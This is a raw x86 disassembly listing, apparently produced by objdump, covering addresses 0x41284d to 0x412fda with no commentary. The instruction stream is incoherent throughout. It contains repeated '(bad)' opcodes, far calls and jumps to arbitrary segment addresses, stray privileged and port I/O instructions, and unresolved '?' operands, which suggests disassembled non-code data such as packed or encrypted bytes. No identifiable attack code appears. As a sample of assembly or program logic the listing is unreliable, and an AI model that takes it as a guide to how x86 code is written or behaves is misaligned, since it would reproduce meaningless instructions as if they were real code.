  41284d:	lock jne 0x4128cd
  412850:	shl    BYTE PTR [ebx*2+0x68b698ed],cl
  412857:	pop    ebx
  412858:	jbe    0x41288a
  41285a:	jp     0x412862
  41285c:	inc    esp
  41285d:	stc    
  41285e:	outs   dx,BYTE PTR ds:[esi]
  41285f:	std    
  412860:	sbb    BYTE PTR [esi-0x7c573f1a],0x4
  412867:	xor    al,0xf2
  412869:	cld    
  41286a:	adc    eax,0xb277e1b4
  41286f:	(bad)  
  412871:	fdiv   QWORD PTR [eax+0x2edf09d6]
  412877:	add    ebp,DWORD PTR [ebx]
  412879:	mov    al,ds:0x6086b641
  41287e:	xchg   ebx,eax
  41287f:	cmp    DWORD PTR [ecx-0x31],edx
  412882:	sbb    DWORD PTR [ebp-0x7cba598e],eax
  412888:	int    0xdd
  41288a:	(bad)  
  41288c:	sbb    eax,0xfd89d85d
  412891:	cmp    eax,0x48ebeb8e
  412896:	jne    0x4128e2
  412898:	inc    edx
  412899:	push   ebp
  41289a:	mov    ds:0x253abe88,al
  41289f:	cmp    al,BYTE PTR ds:0x636a112c
  4128a5:	jge    0x41285a
  4128a7:	cdq    
  4128a8:	sbb    al,0xb2
  4128aa:	adc    DWORD PTR [edi+ecx*1-0x2],0x35
  4128af:	pop    es
  4128b0:	sub    ebx,DWORD PTR [esi]
  4128b2:	into   
  4128b3:	pop    edx
  4128b4:	jnp    0x41291c
  4128b6:	cmp    edi,ebp
  4128b8:	pusha  
  4128b9:	jno    0x412895
  4128bb:	sahf   
  4128bc:	retf   0x98f5
  4128bf:	sub    eax,0x1c3b4bb5
  4128c4:	mov    al,ds:0xc38bd2e
  4128c9:	xchg   ebx,eax
  4128ca:	test   eax,0xd347d1e4
  4128cf:	adc    ch,bh
  4128d1:	int    0x53
  4128d3:	pop    ecx
  4128d4:	xchg   ebx,eax
  4128d5:	dec    eax
  4128d6:	test   eax,0x3dc9dba6
  4128db:	lds    esi,FWORD PTR [edi-0x54]
  4128de:	xor    DWORD PTR [ebx+0x60bf5f1],ebp
  4128e4:	out    0xdc,eax
  4128e6:	ret    0xf7c2
  4128e9:	iret   
  4128ea:	lods   eax,DWORD PTR ds:[esi]
  4128eb:	imul   DWORD PTR [edi-0x55362075]
  4128f1:	je     0x412888
  4128f3:	push   ds
  4128f4:	call   0x1276:0x6acfa5c4
  4128fb:	rcr    BYTE PTR [eax],cl
  4128fd:	out    dx,eax
  4128fe:	jmp    0x2e2f9804
  412903:	jmp    0xe6ef:0x4b763ab
  41290a:	jecxz  0x412894
  41290c:	dec    edi
  41290d:	sub    cl,BYTE PTR [edi]
  41290f:	mov    ebx,0xce023f81
  412914:	scas   eax,DWORD PTR es:[edi]
  412915:	or     cl,BYTE PTR [edi]
  412917:	pop    eax
  412918:	pop    ebx
  412919:	adc    bl,BYTE PTR [esi+0x2a]
  41291c:	dec    ecx
  41291d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41291e:	push   edi
  41291f:	ror    BYTE PTR [edx+0x53],cl
  412922:	sub    DWORD PTR [edi],ebp
  412924:	sbb    esi,DWORD PTR [edx]
  412926:	addr16 sbb eax,ebp
  412929:	aad    0xa9
  41292b:	push   edi
  41292c:	mov    dh,0xd6
  41292e:	push   ss
  41292f:	sti    
  412930:	dec    esi
  412931:	push   esi
  412932:	xlat   BYTE PTR ds:[ebx]
  412933:	mov    al,0xab
  412935:	jb     0x4128e8
  412937:	test   al,0xd
  412939:	scas   eax,DWORD PTR es:[edi]
  41293a:	fcmovbe st,st(5)
  41293c:	jge    0x4128d9
  41293e:	push   es
  41293f:	loop   0x412925
  412941:	daa    
  412942:	push   ds
  412943:	mov    WORD PTR [edx-0x1c],?
  412946:	and    DWORD PTR [eax-0xa250edd],esi
  41294c:	iret   
  41294d:	lods   eax,DWORD PTR ds:[esi]
  41294e:	inc    ebp
  41294f:	mov    ebx,0xdb145bf5
  412954:	xchg   esp,eax
  412955:	mov    dl,0xfb
  412957:	add    ah,dl
  412959:	leave  
  41295a:	mov    BYTE PTR [edi+0x26],ah
  41295d:	stos   BYTE PTR es:[edi],al
  41295e:	xchg   ebp,eax
  41295f:	inc    edi
  412960:	sbb    esp,ebx
  412962:	aaa    
  412963:	imul   ebx,DWORD PTR [edi],0x59
  412966:	sar    ebx,0x94
  412969:	fistp  WORD PTR ds:[ecx]
  41296c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41296d:	ret    
  41296e:	mov    esp,0x941e4b2
  412973:	add    cl,BYTE PTR [eax]
  412975:	xor    al,dh
  412977:	xchg   DWORD PTR [edx-0x196dd9a3],esi
  41297d:	mov    ecx,0x6dee0f55
  412982:	das    
  412983:	call   0x546e:0x84384659
  41298a:	inc    edi
  41298b:	cli    
  41298c:	mov    al,0x7
  41298e:	sub    BYTE PTR [edx+0x4ac4c994],ch
  412994:	lds    ebp,FWORD PTR [ebp-0x6f20fbdc]
  41299a:	and    BYTE PTR [eax-0x1b],bh
  41299d:	in     al,0xdd
  41299f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129a1:	cmp    al,0x2b
  4129a3:	leave  
  4129a4:	push   cs
  4129a5:	(bad)  
  4129a6:	push   es
  4129a7:	and    edi,ebp
  4129a9:	ror    ebp,1
  4129ab:	xor    dh,bh
  4129ad:	sub    al,0x17
  4129af:	mov    eax,0x6d198270
  4129b4:	push   ebx
  4129b5:	xchg   ecx,eax
  4129b6:	xor    dl,BYTE PTR ds:[edx]
  4129b9:	popf   
  4129ba:	inc    esp
  4129bb:	dec    edi
  4129bc:	aad    0x84
  4129be:	nop
  4129bf:	(bad)  
  4129c0:	mov    DWORD PTR [edi],eax
  4129c2:	xchg   BYTE PTR [esi-0x65128eb9],bh
  4129c8:	jmp    0x8a3c:0x7a610d1c
  4129cf:	inc    ebp
  4129d0:	ja     0x4129d6
  4129d2:	sbb    ebp,DWORD PTR [eax]
  4129d4:	dec    edx
  4129d5:	inc    ebx
  4129d6:	fs call 0xbc1d:0x126cb37d
  4129de:	pusha  
  4129df:	imul   esi,ebp,0x8f98b0d9
  4129e5:	iret   
  4129e6:	cmc    
  4129e7:	xlat   BYTE PTR ds:[ebx]
  4129e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129e9:	inc    esp
  4129ea:	adc    bh,cl
  4129ec:	sbb    DWORD PTR [edi],0x57
  4129ef:	arpl   sp,ax
  4129f1:	xchg   ebx,eax
  4129f2:	mov    ebp,0xbc304c2e
  4129f7:	cmp    ch,BYTE PTR ds:0xf674f709
  4129fd:	xchg   ecx,eax
  4129fe:	mov    esi,0x328bb79e
  412a03:	lds    esi,FWORD PTR [esi]
  412a05:	daa    
  412a06:	xor    al,0xc4
  412a08:	push   ds
  412a09:	rol    BYTE PTR [eax],1
  412a0b:	sub    DWORD PTR [eax+0x9],0x89e0edf
  412a12:	mov    ah,0x85
  412a14:	gs push 0x68
  412a17:	inc    ebx
  412a18:	and    DWORD PTR [edi+0x4d93fdb6],esp
  412a1e:	std    
  412a1f:	fmul   DWORD PTR [esi]
  412a21:	push   eax
  412a22:	es mov ch,0xb4
  412a25:	nop
  412a26:	sub    esp,DWORD PTR [ecx]
  412a28:	push   edx
  412a29:	call   0x91ea:0x32c67472
  412a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a31:	inc    edx
  412a32:	xlat   BYTE PTR ds:[ebx]
  412a33:	sbb    ecx,edi
  412a35:	mov    dh,0x20
  412a37:	mov    eax,ds:0xc362de68
  412a3c:	ret    
  412a3d:	cli    
  412a3e:	bound  eax,QWORD PTR [edi*4-0x6fc988f6]
  412a45:	adc    ebx,edx
  412a47:	dec    edx
  412a49:	mov    dl,0xf4
  412a4b:	sbb    dl,BYTE PTR [edx+eiz*2-0x1c1740a3]
  412a52:	xor    ah,ch
  412a54:	pop    edx
  412a55:	sbb    bh,ah
  412a57:	lods   al,BYTE PTR ds:[esi]
  412a58:	mov    ebx,?
  412a5a:	cmc    
  412a5b:	test   al,0xea
  412a5d:	sub    eax,0x40582c86
  412a62:	mov    dh,0x36
  412a64:	shr    BYTE PTR [edi+ecx*2+0x2d],cl
  412a68:	into   
  412a69:	out    dx,al
  412a6a:	xchg   edx,eax
  412a6b:	std    
  412a6c:	mov    dl,BYTE PTR [ecx+0x3]
  412a6f:	popa   
  412a70:	je     0x4129f5
  412a72:	fidivr WORD PTR [esi+edx*4-0x65]
  412a76:	inc    esi
  412a77:	mov    WORD PTR [edx],?
  412a79:	cld    
  412a7a:	fisub  WORD PTR [eax-0x2b8c65dd]
  412a80:	rcl    dh,1
  412a82:	push   ebx
  412a83:	in     al,dx
  412a84:	adc    al,0xa
  412a86:	jne    0x412a84
  412a88:	loop   0x412a6e
  412a8a:	clc    
  412a8b:	fnsave [edx-0x51c25893]
  412a91:	mov    ch,BYTE PTR [esi-0x4c]
  412a94:	cmp    BYTE PTR [eax],dh
  412a96:	and    al,0xa3
  412a98:	div    BYTE PTR [ebx-0x4b]
  412a9b:	cli    
  412a9c:	jae    0x412ad3
  412a9e:	cmp    ecx,DWORD PTR [ebx]
  412aa0:	cwde   
  412aa1:	mov    bh,0xc9
  412aa3:	and    DWORD PTR [esi+0x223c5b67],edx
  412aa9:	xlat   BYTE PTR ds:[ebx]
  412aaa:	aaa    
  412aab:	push   ebx
  412aac:	or     dl,cl
  412aae:	and    BYTE PTR [edx-0x2b9b7410],cl
  412ab4:	int    0xea
  412ab6:	or     BYTE PTR [esi],dl
  412ab8:	(bad)  
  412ab9:	pop    ebp
  412aba:	sub    eax,0xd78f8a64
  412abf:	add    ch,dh
  412ac1:	adc    eax,0xe65ecd26
  412ac6:	mov    ah,0xc7
  412ac8:	mov    BYTE PTR [esi+0x50df153b],dh
  412ace:	into   
  412acf:	mov    edx,esi
  412ad1:	fs or  bl,dh
  412ad4:	je     0x412a66
  412ad6:	not    cl
  412ad8:	imul   bl
  412ada:	sti    
  412adb:	test   al,0x86
  412add:	dec    eax
  412ade:	jno    0x412b00
  412ae0:	outs   dx,BYTE PTR ds:[esi]
  412ae1:	call   0xc932:0x1d804845
  412ae8:	cmp    edx,DWORD PTR ds:0x4ff92087
  412aee:	popf   
  412aef:	mov    bl,0x6c
  412af1:	sub    dh,BYTE PTR [edi-0x132365bd]
  412af7:	call   0x273a:0x25291c14
  412afe:	mov    ebp,0x4cd9746d
  412b03:	out    dx,eax
  412b04:	and    al,0x40
  412b06:	sub    BYTE PTR [eax-0x66ce89cd],ah
  412b0c:	xchg   esi,eax
  412b0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b0e:	pop    esp
  412b0f:	imul   ecx,ebp,0xfffffffa
  412b12:	loopne 0x412b25
  412b14:	lea    esi,[edx+ecx*1+0x14a4e1d3]
  412b1b:	add    BYTE PTR [ecx],0xb9
  412b1e:	int3   
  412b1f:	ins    BYTE PTR es:[edi],dx
  412b20:	xor    ch,BYTE PTR [ebx-0x1995708c]
  412b26:	xchg   DWORD PTR ds:0x6aa493aa,esp
  412b2c:	rcl    DWORD PTR [ecx+0x7f],cl
  412b2f:	mov    bh,0x51
  412b31:	mov    DWORD PTR [edx],edx
  412b33:	dec    ebp
  412b34:	in     al,0x39
  412b36:	stos   BYTE PTR es:[edi],al
  412b37:	mov    ah,0x4a
  412b39:	and    DWORD PTR [ecx+eax*2-0x728f178e],ecx
  412b40:	inc    edi
  412b41:	hlt    
  412b42:	out    dx,al
  412b43:	inc    edi
  412b44:	jae    0x412ac7
  412b46:	xor    bl,BYTE PTR [ecx]
  412b48:	out    0x5d,al
  412b4a:	mov    eax,ds:0xb57f7d46
  412b4f:	aas    
  412b50:	jbe    0x412b1c
  412b52:	xchg   DWORD PTR ss:[ebp-0x4db4f483],ebp
  412b59:	mov    dh,0x44
  412b5b:	imul   ecx,DWORD PTR [ecx],0x50fbdfcb
  412b61:	cmp    esp,DWORD PTR [edx-0x18]
  412b64:	pop    esp
  412b65:	popw   ds
  412b67:	hlt    
  412b68:	push   esi
  412b69:	es je  0x412b2c
  412b6c:	cld    
  412b6d:	(bad)  
  412b6e:	je     0x412b9b
  412b70:	pop    esi
  412b71:	std    
  412b72:	bound  ebp,QWORD PTR [esi+0x14]
  412b75:	fwait
  412b76:	jl     0x412b23
  412b78:	(bad)  
  412b79:	sbb    eax,0x157e1990
  412b7e:	fldenv [edi-0x61]
  412b81:	mov    dh,0xf7
  412b83:	xor    ecx,DWORD PTR [ebx+0x70]
  412b86:	in     eax,dx
  412b87:	aaa    
  412b88:	das    
  412b89:	sbb    DWORD PTR [edx+0x5b],ebp
  412b8c:	and    cl,BYTE PTR [eax+0x4694e0d9]
  412b92:	cmp    ch,ch
  412b94:	jle    0x412bf8
  412b96:	jmp    0x412c0b
  412b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b99:	xor    al,0x12
  412b9b:	push   ebp
  412b9c:	ss mov BYTE PTR cs:[esp+edx*8-0x45],dh
  412ba2:	fwait
  412ba3:	ja     0x412b6d
  412ba5:	mov    DWORD PTR [esi-0x25],esp
  412ba8:	js     0x412b83
  412baa:	stc    
  412bab:	ins    DWORD PTR es:[edi],dx
  412bac:	xchg   edx,eax
  412bad:	sub    eax,0x768b29f
  412bb2:	outs   dx,DWORD PTR ds:[esi]
  412bb3:	xchg   edi,eax
  412bb4:	ins    BYTE PTR es:[edi],dx
  412bb5:	loop   0x412b44
  412bb7:	cmp    DWORD PTR [esi+0x4b],0x506fea51
  412bbe:	jp     0x412c3d
  412bc0:	ins    DWORD PTR es:[edi],dx
  412bc1:	jno    0x412bd3
  412bc3:	or     cl,BYTE PTR [ebx+0x44ec3813]
  412bc9:	cmp    BYTE PTR [edx+0x1d],dh
  412bcc:	(bad)  
  412bce:	inc    edx
  412bcf:	lea    ebx,[ebp+0x6c77f5ef]
  412bd5:	sub    dl,0xe3
  412bd8:	cwde   
  412bd9:	pop    ss
  412bda:	pop    edi
  412bdb:	repnz pop ecx
  412bdd:	int    0xb1
  412bdf:	shr    ecx,1
  412be1:	(bad)  
  412be2:	loope  0x412bb0
  412be4:	(bad)  
  412be5:	std    
  412be6:	push   edx
  412be7:	mov    al,0xad
  412be9:	adc    BYTE PTR [eax+ebx*4-0x56bb0877],bh
  412bf0:	fisubr DWORD PTR [edx]
  412bf2:	inc    edi
  412bf3:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf5:	int3   
  412bf6:	je     0x412bed
  412bf8:	inc    edi
  412bf9:	add    ebx,ebx
  412bfb:	push   eax
  412bfc:	ret    0xaa43
  412bff:	and    dl,BYTE PTR [eax+0x81ee0e2]
  412c05:	loope  0x412c00
  412c07:	pusha  
  412c08:	fld    DWORD PTR [eax-0x1e]
  412c0b:	loop   0x412c2b
  412c0d:	xchg   esp,eax
  412c0e:	inc    edi
  412c0f:	mov    al,0xae
  412c11:	test   BYTE PTR [ecx+0x40],dl
  412c14:	imul   esp,DWORD PTR [edi-0x55],0xffffffd2
  412c18:	cmp    eax,0x11a0df38
  412c1d:	enter  0x76ac,0x31
  412c21:	sti    
  412c22:	daa    
  412c23:	popf   
  412c24:	enter  0xf029,0x53
  412c28:	mov    edx,0x8ff65144
  412c2d:	adc    BYTE PTR [ebx-0x61a38e2f],ch
  412c33:	imul   BYTE PTR [ecx+0x38]
  412c36:	shl    DWORD PTR [esi],cl
  412c38:	mov    edx,0x871a5a9c
  412c3d:	das    
  412c3e:	fbstp  TBYTE PTR [esi]
  412c40:	lahf   
  412c41:	mov    ebx,0x1e46935f
  412c46:	mov    DWORD PTR [esi+0x7144231d],ebp
  412c4c:	dec    edi
  412c4d:	js     0x412c14
  412c4f:	shl    BYTE PTR [edx+0x4d],1
  412c52:	mov    gs,WORD PTR [esi+edi*2]
  412c55:	loopne 0x412c78
  412c57:	add    DWORD PTR [ebp+0x3],edx
  412c5a:	retf   0xdfa
  412c5d:	dec    ecx
  412c5e:	jae    0x412c42
  412c60:	and    BYTE PTR [esp+esi*8+0x14],0x8c
  412c65:	or     eax,0x5aa3a4a8
  412c6a:	add    BYTE PTR [edx],al
  412c6c:	push   0xc84341a7
  412c71:	mov    ds:0x6274c859,al
  412c76:	(bad)  
  412c77:	bound  edi,QWORD PTR [ebp+0x247bff75]
  412c7d:	aam    0xef
  412c7f:	add    DWORD PTR [ebx+0x4a],edi
  412c82:	(bad)  
  412c83:	mov    DWORD PTR ds:0x8a0c6369,esi
  412c89:	xor    eax,0xd2dacf43
  412c8e:	xchg   BYTE PTR [ebx-0x613ed165],ah
  412c94:	adc    eax,0xc9a68659
  412c99:	xor    bl,bl
  412c9b:	sub    dh,BYTE PTR [ebx]
  412c9d:	inc    eax
  412c9e:	adc    al,0xd1
  412ca0:	lock jle 0x412ced
  412ca3:	push   eax
  412ca4:	(bad)  
  412ca5:	das    
  412ca6:	repnz push 0xfffffff3
  412ca9:	ret    0xe057
  412cac:	jle    0x412cde
  412cae:	add    DWORD PTR [ecx],ebp
  412cb0:	lds    ecx,FWORD PTR [edi+0x5933b62b]
  412cb6:	adc    ebx,DWORD PTR [ebx+0x17]
  412cb9:	adc    al,0x19
  412cbb:	jge    0x412c43
  412cbd:	cdq    
  412cbe:	mov    ebx,0x8c3f7858
  412cc3:	(bad)  
  412cc4:	fnstcw WORD PTR [eax+eax*2]
  412cc7:	repz call 0x65074457
  412ccd:	rcl    BYTE PTR [ecx-0x2a5a7e75],0x3b
  412cd4:	test   al,bh
  412cd6:	sbb    BYTE PTR [esi+0x2dd179a7],al
  412cdc:	and    BYTE PTR [edx],dh
  412cde:	or     al,BYTE PTR [ecx]
  412ce0:	mov    ?,WORD PTR [edi+0x7b]
  412ce3:	(bad)  
  412ce4:	shl    BYTE PTR [edx],1
  412ce6:	and    ah,BYTE PTR [esi+0x6261f3b5]
  412cec:	xchg   BYTE PTR [ebp-0x37afc7c2],dh
  412cf2:	call   0x1975fd8d
  412cf7:	inc    DWORD PTR [ecx+0x3]
  412cfa:	push   ebp
  412cfb:	inc    ecx
  412cfc:	inc    edi
  412cfd:	ins    DWORD PTR es:[edi],dx
  412cfe:	cwde   
  412cff:	mov    ds:0x566d1f55,eax
  412d04:	mov    eax,0x7af55f22
  412d09:	dec    edi
  412d0a:	add    BYTE PTR [eax+0x2f],ah
  412d0d:	cmp    eax,0x40e93bd3
  412d12:	mov    eax,0x476e25b
  412d17:	xchg   esi,eax
  412d18:	shl    dl,cl
  412d1a:	push   edi
  412d1b:	fldenv [eax-0x21]
  412d1e:	sbb    ebx,DWORD PTR [eax-0x77dcbf0e]
  412d24:	test   al,0x7
  412d26:	cmc    
  412d27:	pop    esi
  412d28:	push   ecx
  412d29:	or     ebp,DWORD PTR [edi-0x4cc32385]
  412d2f:	jecxz  0x412cd8
  412d31:	fadd   st,st(3)
  412d33:	dec    ebp
  412d34:	(bad)  
  412d35:	xlat   BYTE PTR ds:[ebx]
  412d36:	mov    esp,DWORD PTR [esi]
  412d38:	add    al,0xf3
  412d3a:	jo     0x412d12
  412d3c:	clc    
  412d3d:	adc    BYTE PTR [edx],ch
  412d3f:	loopne 0x412cfa
  412d41:	scas   eax,DWORD PTR es:[edi]
  412d42:	aas    
  412d43:	adc    ecx,ebp
  412d45:	ret    
  412d46:	and    ah,BYTE PTR [esi]
  412d48:	mov    edi,0xdb50b88f
  412d4d:	mov    edi,0x194e1900
  412d52:	cmp    eax,0xc8e1d2f2
  412d57:	mov    bl,bl
  412d59:	mov    ah,0xda
  412d5b:	xor    eax,0x8d567b4d
  412d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d61:	aad    0x16
  412d63:	ret    0xbeac
  412d66:	mov    cl,0x95
  412d68:	inc    ecx
  412d69:	cmp    ecx,DWORD PTR [ebx-0x4a]
  412d6c:	dec    ebp
  412d6d:	sub    ebx,DWORD PTR [ebp-0x41]
  412d70:	sub    al,0xf
  412d72:	repz dec eax
  412d74:	mov    eax,ds:0x5efdba1f
  412d79:	push   ebp
  412d7a:	push   eax
  412d7b:	mov    ds:0x7449bbcd,al
  412d80:	mov    dh,0xc2
  412d82:	dec    edi
  412d83:	sbb    ebx,edx
  412d85:	rcl    BYTE PTR [ebx-0x9],0x76
  412d89:	(bad)  
  412d8a:	xchg   ebx,eax
  412d8b:	mov    eax,0x92a451c5
  412d90:	cmp    edi,esp
  412d92:	pop    ds
  412d93:	test   bl,bl
  412d95:	jne    0x412dd0
  412d97:	mov    ds:0xfbf4c0ab,al
  412d9c:	xchg   esp,eax
  412d9d:	mov    ds:0xc6124a9f,al
  412da2:	mov    edi,0xecc9f0fe
  412da7:	pop    ss
  412da8:	xchg   ebx,eax
  412da9:	rcr    DWORD PTR [eax-0x9401dfb],1
  412daf:	xchg   ecx,eax
  412db0:	jae    0x412df5
  412db2:	cs sbb al,0x32
  412db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db6:	pop    ebp
  412db7:	add    DWORD PTR [esi+0x41],ebx
  412dba:	jl     0x412dae
  412dbc:	xor    DWORD PTR [edi+0x3b],esi
  412dbf:	push   ebp
  412dc0:	cli    
  412dc1:	push   es
  412dc2:	jbe    0x412e2e
  412dc4:	pop    esi
  412dc5:	xchg   ebx,eax
  412dc6:	push   edi
  412dc7:	sbb    esi,DWORD PTR [ebx-0x76]
  412dca:	pop    edx
  412dcb:	push   es
  412dcc:	jmp    0x412d5b
  412dce:	cvtps2pd xmm0,QWORD PTR [edi]
  412dd1:	cmp    al,0x5e
  412dd3:	not    DWORD PTR [esi+edx*2+0x69]
  412dd7:	xlat   BYTE PTR ds:[ebx]
  412dd8:	loop   0x412db8
  412dda:	stos   DWORD PTR es:[edi],eax
  412ddb:	mov    ebx,0xe874e5db
  412de0:	mov    WORD PTR [edi-0x4a430fbf],gs
  412de6:	fbstp  TBYTE PTR [ebx]
  412de8:	inc    edx
  412de9:	jns    0x412e6a
  412deb:	(bad)  
  412dec:	js     0x412ded
  412dee:	leave  
  412def:	data16 test BYTE PTR [edx+0x5b],al
  412df3:	arpl   WORD PTR [eax+0x76],bp
  412df6:	push   eax
  412df7:	mov    eax,ds:0xa70c12d1
  412dfc:	mov    eax,0xddbf0a98
  412e01:	pop    ebx
  412e02:	inc    ebp
  412e03:	jae    0x412db8
  412e05:	retf   0xa56a
  412e08:	inc    ebx
  412e09:	push   ecx
  412e0a:	mov    es,WORD PTR [ecx+0x1eacd17f]
  412e10:	sub    al,0x56
  412e12:	pop    ecx
  412e13:	mov    ah,0xc
  412e15:	xchg   edx,eax
  412e16:	cli    
  412e17:	pop    esi
  412e18:	pop    es
  412e19:	sahf   
  412e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e1b:	fdiv   QWORD PTR [ebx-0x2a]
  412e1e:	xor    al,0x2a
  412e20:	(bad)  
  412e22:	outs   dx,BYTE PTR ds:[esi]
  412e23:	mov    eax,ebp
  412e25:	adc    DWORD PTR [esi],eax
  412e27:	and    bh,BYTE PTR gs:[ebx-0x11]
  412e2b:	pop    edx
  412e2c:	mov    bh,0x40
  412e2e:	jl     0x412de2
  412e30:	cmp    dh,al
  412e32:	push   cs
  412e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e35:	(bad)  
  412e36:	jmp    FWORD PTR [ecx-0x7547276a]
  412e3c:	cmp    BYTE PTR [ebp+0x7a51c917],0xa1
  412e43:	inc    edi
  412e44:	mov    esp,0x3bde68c3
  412e49:	cmp    eax,0x7d5d328e
  412e4e:	popf   
  412e4f:	inc    esi
  412e50:	add    al,0xd5
  412e52:	fld    DWORD PTR [ebp-0x18]
  412e55:	stos   BYTE PTR es:[edi],al
  412e56:	mov    dh,0x93
  412e58:	js     0x412dde
  412e5a:	in     al,dx
  412e5b:	jl     0x412e87
  412e5d:	jge    0x412e98
  412e5f:	test   al,0x2c
  412e61:	daa    
  412e62:	retf   0x7c00
  412e65:	adc    ebx,ebx
  412e67:	in     eax,dx
  412e68:	mov    bl,BYTE PTR [esi*4+0x60eadf8c]
  412e6f:	adc    ebx,edx
  412e71:	push   ss
  412e72:	loop   0x412e23
  412e74:	test   eax,0xc10b1d9
  412e79:	test   DWORD PTR [ebp+0x69da9146],edx
  412e7f:	inc    ebx
  412e80:	pop    eax
  412e82:	aas    
  412e83:	jns    0x412e53
  412e85:	test   BYTE PTR [edx+0x12],dh
  412e88:	xlat   BYTE PTR ds:[ebx]
  412e89:	shl    ah,cl
  412e8b:	mov    ?,WORD PTR [ecx+0x45]
  412e8e:	push   ebp
  412e8f:	add    BYTE PTR [ebx],dh
  412e91:	mov    al,ds:0x1236501c
  412e96:	in     eax,dx
  412e97:	pop    ebx
  412e98:	ja     0x412ee8
  412e9a:	pop    esp
  412e9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e9c:	mov    edi,0x535288b4
  412ea1:	mov    edx,0xc7abc0a6
  412ea6:	xchg   BYTE PTR cs:[esi],al
  412ea9:	cmp    BYTE PTR [ebp-0x279a9f16],al
  412eaf:	enterw 0x93b7,0x35
  412eb4:	xchg   esp,eax
  412eb5:	and    esi,ebx
  412eb7:	sti    
  412eb8:	inc    eax
  412eb9:	fcom   QWORD PTR ds:0x4022e884
  412ec0:	cld    
  412ec1:	sti    
  412ec2:	or     edi,DWORD PTR [ebx]
  412ec4:	inc    DWORD PTR [ebx+0x57cbd837]
  412eca:	cmp    ebp,DWORD PTR [esi+0x3c]
  412ecd:	mov    eax,DWORD PTR [esi+0x17c9f890]
  412ed3:	stc    
  412ed4:	jge    0x412f17
  412ed6:	sub    eax,0xc8c98db9
  412edb:	fwait
  412edc:	xchg   BYTE PTR ds:0x916188cb,dl
  412ee2:	in     eax,0xcf
  412ee4:	jns    0x412f61
  412ee6:	xchg   edx,eax
  412ee7:	or     BYTE PTR [edi+0x7f],cl
  412eea:	call   0x3b56:0xe54a061c
  412ef1:	push   edx
  412ef2:	sub    eax,0x60184b70
  412ef7:	aaa    
  412ef8:	call   0xc7f9eb6e
  412efd:	inc    esp
  412efe:	dec    esi
  412eff:	aas    
  412f00:	push   eax
  412f01:	repz mov edx,0xe8c7f98d
  412f07:	pusha  
  412f08:	push   ebx
  412f09:	dec    ecx
  412f0a:	test   DWORD PTR [ebx-0x5374ce56],ebp
  412f10:	mov    ebx,0xb1912ac
  412f15:	std    
  412f16:	jle    0x412f5c
  412f18:	out    dx,eax
  412f19:	xor    al,0xb9
  412f1b:	push   esi
  412f1c:	popf   
  412f1d:	push   cs
  412f1e:	je     0x412f06
  412f20:	mov    bl,0xd
  412f22:	pop    ds
  412f23:	mov    bh,0xdf
  412f25:	fld    DWORD PTR [edi-0x74fe8fd]
  412f2b:	sub    al,0xa1
  412f2d:	(bad)  
  412f2e:	(bad)  
  412f2f:	sbb    edx,DWORD PTR [esi-0x5b]
  412f32:	mov    ebx,0x78409630
  412f37:	adc    DWORD PTR [esi-0x39],esi
  412f3a:	dec    esp
  412f3b:	mov    al,ds:0x1918a3ee
  412f40:	mov    WORD PTR [ecx+ebx*8+0x43c3d401],cs
  412f47:	mov    al,0x71
  412f49:	and    esi,DWORD PTR es:[ebx-0x7b]
  412f4d:	jae    0x412fc9
  412f4f:	loop   0x412edc
  412f51:	cdq    
  412f52:	paddusb mm4,mm0
  412f55:	cmp    eax,DWORD PTR [edi+0x56d7dabe]
  412f5b:	cmp    edx,DWORD PTR [ebp-0xe]
  412f5e:	cmp    ah,dh
  412f60:	sbb    al,0x43
  412f62:	mov    ah,0xae
  412f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f65:	or     al,0xf5
  412f67:	ins    DWORD PTR es:[edi],dx
  412f68:	jge    0x412f39
  412f6a:	mov    esi,0xe9e595be
  412f6f:	or     BYTE PTR [ebx],bh
  412f71:	cmp    DWORD PTR [edi-0x1ccd6122],esp
  412f77:	loope  0x412f48
  412f79:	mov    al,0x83
  412f7b:	enter  0xb04b,0x6f
  412f7f:	sub    bl,ah
  412f81:	jns    0x412f99
  412f83:	sar    ebp,0xfd
  412f86:	mov    al,ds:0xe231f710
  412f8b:	pop    esi
  412f8c:	jnp    0x412fa0
  412f8e:	stos   DWORD PTR es:[edi],eax
  412f8f:	and    edx,ebx
  412f91:	fcom   QWORD PTR [esi]
  412f93:	aas    
  412f94:	mov    edx,ebp
  412f96:	adc    eax,0xc64ab588
  412f9b:	stos   BYTE PTR es:[edi],al
  412f9c:	jb     0x412fba
  412f9e:	push   ebp
  412f9f:	ins    DWORD PTR es:[edi],dx
  412fa0:	xchg   ebp,eax
  412fa1:	loop   0x41301c
  412fa3:	xchg   esi,eax
  412fa4:	jg     0x412f2d
  412fa6:	enter  0x549e,0xe
  412faa:	fs pusha 
  412fac:	arpl   di,bp
  412fae:	outs   dx,DWORD PTR es:[esi]
  412fb0:	push   ecx
  412fb1:	cmp    DWORD PTR [esi+0x1],esp
  412fb4:	jo     0x412f6f
  412fb6:	or     esp,DWORD PTR ss:[eax]
  412fb9:	xchg   ebp,eax
  412fba:	sub    dl,dl
  412fbc:	mov    dl,0xd5
  412fbe:	xchg   edi,eax
  412fbf:	mov    eax,ds:0xb44c4a02
  412fc4:	das    
  412fc5:	push   edi
  412fc6:	jo     0x41301a
  412fc8:	inc    edi
  412fc9:	jp     0x412f62
  412fcb:	stos   BYTE PTR es:[edi],al
  412fcc:	cmp    DWORD PTR [esi+0x7c],0xfffffff3
  412fd0:	mov    esi,0x795bb07b
  412fd5:	neg    DWORD PTR [esi-0x33]
  412fd8:	and    BYTE PTR [edi],ch
  412fda:	mov    ebx,0xf19ca0be
